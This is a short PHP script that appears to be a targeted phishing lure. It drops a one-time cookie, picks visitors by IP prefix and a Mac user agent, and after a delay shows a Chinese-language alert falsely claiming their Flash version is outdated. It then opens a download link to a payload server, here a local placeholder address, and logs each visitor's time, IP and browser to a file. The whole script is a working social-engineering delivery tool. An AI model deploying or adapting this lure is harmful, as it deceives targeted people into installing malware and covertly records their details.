<?php
 $cookie_origin = "cloudswordSpecialCookie";
 if (@$_COOKIE['ip'] == $cookie_origin) {
 	die();
 }
 setcookie("ip", $cookie_origin, time() + 1333 * 333);

$addres = array("ip1" => "xxx.xxx.xxx", "ip2" => "yyy.yyy.yyy", "ip3" => "127.0.0");

$ip = $_SERVER['REMOTE_ADDR'];
if($ip=="::1"){
	$ip="127.0.0.1";
}
$ipc=explode(".",$ip,-1);
$ip_cdir=join('.',$ipc);

$searchip = array_search($ip_cdir, $addres);

$ua = $_SERVER['HTTP_USER_AGENT'];

if (strpos($ua, 'Mac')) {
	if (isset($searchip)) {
		//3000毫秒后 弹出下载
		echo "<script type=\"text/javascript\">function send(){alert(\"您的FLASH版本过低，尝试升级后访问该页面!\");window.open(\"http://127.0.0.1:8080/download\");};setTimeout(send,10000);//等待2秒后执行</script>";
	}
}

$fp = fopen("iplog.txt", "at");
fputs($fp, "TIME: " . date('Y/m/d H:i:s') . "  IP: " . $ip . "   UA: " . $ua . "   ref: " . $ref . "\n");
fclose($fp);
